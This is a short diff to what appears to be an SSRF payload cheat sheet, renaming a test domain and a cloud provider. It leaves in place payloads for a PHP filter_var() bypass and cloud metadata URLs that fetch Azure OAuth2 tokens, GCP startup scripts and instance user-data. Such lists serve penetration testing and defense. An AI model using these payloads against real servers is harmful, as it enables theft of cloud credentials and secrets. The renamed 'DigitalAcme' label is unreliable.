@@ -92,7 +92,7 @@ http:127.0.0.1/
 ### PHP filter_var() Bypass
 
 ```
-http://test???test.com
+http://test???test.example
 0://evil.example:80;http://google.com:80/
 ```
 
@@ -172,7 +172,7 @@ http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&res
 
 Header required: `Metadata: true`
 
-### DigitalOcean
+### DigitalAcme
 
 ```
 http://169.254.169.254/metadata/v1/
@@ -200,7 +200,7 @@ http://metadata.google.internal/computeMetadata/v1/instance/attributes/
 http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
 # Azure (Metadata: true) — customData is base64
 http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01
-# DigitalOcean
+# DigitalAcme
 http://169.254.169.254/metadata/v1/user-data
 ```
 
